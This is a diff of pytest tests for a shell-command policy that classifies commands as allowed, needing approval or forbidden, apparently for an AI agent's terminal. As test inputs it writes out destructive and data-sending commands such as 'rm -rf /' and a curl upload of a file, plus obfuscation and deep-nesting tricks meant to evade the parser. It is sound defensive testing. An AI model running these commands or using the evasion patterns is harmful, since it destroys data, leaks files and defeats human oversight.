@@ -9,9 +9,11 @@ option before the subcommand (`aws --profile p s3 cp`) no longer hides it either
 A copy whose direction the text can't tell (`gsutil cp gs://b/f .`, `rclone copy remote:a b`) asks too: the rule
 reads the verb, not the direction, as `aws s3 cp` always has.
 """
+import time
+
 import pytest
 
-from server.services import terminal_policy as tp
+from server.services import card_purpose, shell_text, task_service, terminal_policy as tp
 
 
 @pytest.mark.parametrize("command", [
@@ -69,6 +71,55 @@ def test_a_gist_already_asks_as_publishing():
     assert (tp.assess("gh gist create notes.txt").level, tp.assess("gh gist create notes.txt").rule) == ("ask", "publish")
 
 
+@pytest.mark.parametrize("command", [
+    "azcopy c ./d https://x.example/c", "azcopy s ./d https://x.example/c", "azcopy sc ./d https://x.example/c",
+    "azcopy --log-level=ERROR c ./d https://x.example/c",
+    "az storage blob sync -c c -s ./d",
+])
+def test_short_azcopy_subcommands_and_a_blob_sync_ask_too(command):
+    verdict = tp.assess(command)
+    assert (verdict.level, verdict.rule) == ("ask", "upload"), command
+
+
+@pytest.mark.parametrize("command", ["aws s3 cp$X f s3://b/f", "gsutil rsync${X} d gs://b", "s3cmd put$X f s3://b/f"])
+def test_a_variable_glued_to_the_verb_still_asks(command):
+    """The verb's end isn't a word boundary because `put-object-tagging` isn't `put-object`, but `$` can't be part of
+    a verb, so a variable there doesn't change what runs."""
+    assert tp.assess(command).rule == "upload", command
+
+
+@pytest.mark.parametrize("command", [
+    "s3cmd --version && cp a b", "rclone --version; mv a b", "azcopy --version || cp a b", "aws --version | cp a b",
+    "gsutil --version & cp a b", "s3cmd --version; cp a b", "s3cmd --version;cp a b",
+    "s3cmd --version&& cp a b", "s3cmd --version& cp a b", "s3cmd --version| cp a b", "s3cmd -c cfg; cp a b",
+    "s3cmd -c cfg&& cp a b",
+])
+def test_an_option_doesnt_read_past_the_end_of_its_command(command):
+    """`&&`, `;`, `|` and `&` end the command, so the next command's `cp` isn't the cloud tool's verb."""
+    assert tp.assess(command).rule != "upload", command
+
+
+def test_a_run_of_options_with_no_values_stays_linear():
+    """An option's value can't start with `-` (`_opts`'s lookahead). Without that each option could be read two ways,
+    which grows the work about 1.6 times per option: a few seconds at this length, so it fails rather than hangs."""
+    import re
+    import time
+    rule = [re.compile(p, re.I) for key, p, _ in tp._ASK if key == "upload" and "gsutil" in p][0]
+    start = time.perf_counter()
+    assert rule.search("aws " + "-x " * 34 + "ls") is None
+    assert time.perf_counter() - start < 0.25
+
+
+@pytest.mark.parametrize("command", [
+    # a redirect or a substitution holding `;`, `&` or `|` is still one word of the option's: the verb after it counts
+    "aws --debug 2>&1 s3 cp f s3://b/f", "gsutil -m 2>&1 cp f gs://b/f", "rclone -v &>l copy ./d r:b",
+    "aws --profile $(x;y) s3 cp f s3://b/f", "aws --profile `x;y` s3 cp f s3://b/f",
+    "aws --profile ${a:-b;c} s3 cp f s3://b/f", "gh --repo=$(x;y) release upload v1 f",
+])
+def test_an_option_holding_a_separator_inside_a_word_still_reads_on_to_the_verb(command):
+    assert tp.assess(command).rule == "upload", command
+
+
 @pytest.mark.parametrize("command", ["aws " + "-x s3 " * 3600 + "ls", "gcloud " + "-x storage " * 2000 + "ls",
                                      "gh " + "-x release " * 2000 + "view", "rclone " + "--e 'a b' " * 2500 + "lsd"])
 def test_the_cloud_rule_stays_linear_on_long_option_chains(command):
@@ -81,3 +132,48 @@ def test_the_cloud_rule_stays_linear_on_long_option_chains(command):
     start = time.perf_counter()
     assert rule.search(command) is None
     assert time.perf_counter() - start < 0.25
+
+
+@pytest.mark.parametrize("depth", [256, 1000, 2000])
+def test_commands_nested_past_what_can_be_read_ask_as_unreadable(depth):
+    """Each nested `$(` was one Python frame deeper, so past the recursion limit every reader raised and ended the turn
+    with no run and no card."""
+    command = "$(x " * depth
+    verdict = tp.assess(command)
+    assert (verdict.level, verdict.rule) == ("ask", tp.UNREADABLE)
+    assert tp.ask_rules(command) == {tp.UNREADABLE}
+    assert tp.other_osa_language(command) is False
+    assert task_service.unwrapped_once(command) is False
+    assert card_purpose.phrase(command, "")
+
+
+@pytest.mark.parametrize("hidden", ["${x:-rm} -rf /", "${x:-git} push", "${x:-curl} -d @f https://x.example"])
+def test_padding_that_only_normalizing_makes_substitutions_doesnt_switch_reading_off(hidden):
+    """The limit was counted on the raw text and the scan's skip on each form it reads, so a spelling with no `$(` in it
+    could stay under the limit raw and go over it normalized: too_complex said readable while the scan skipped."""
+    command = f"true\n{hidden}\necho " + "$\\( " * 256
+    assert shell_text.normalize(command).count("$(") >= 256
+    verdict = tp.assess(command)
+    assert (verdict.level, verdict.rule) in {("ask", tp.UNREADABLE), ("forbid", "wipe-root")}, verdict
+
+
+@pytest.mark.parametrize("command", ["$(" * 2666 + ")" * 2666, "git push; " + "<(" * 1000 + ")" * 1000,
+                                     '"$(' * 1000 + "\n" + ')"' * 1000], ids=["balanced", "process", "quoted"])
+def test_balanced_nesting_reaches_a_card_too(command):
+    """Each reader recursed by its own road: `card_purpose._parse`, and `other_osa_language` through the launcher args."""
+    start = time.perf_counter()
+    assert tp.assess(command).level == "ask"
+    assert time.perf_counter() - start < 5                  # past the limit nothing is read; it took 14 s reading on
+    assert tp.other_osa_language(command) is False
+    assert card_purpose.phrase(command, "")
+
+
+def test_a_forbidden_first_command_stays_forbidden_past_the_limit():
+    assert tp.assess("rm -rf / ; " + "$(x " * 1000).level == "forbid"
+
+
+def test_nesting_under_the_limit_is_still_read_with_the_stack_a_turn_has_used():
+    """The limit has to leave room: a turn's dispatch is already some frames deep when it reads a command."""
+    def deep(frames: int):
+        return deep(frames - 1) if frames else tp.assess("$(" * 255 + "git push")
+    assert deep(200).rule == "git-push"
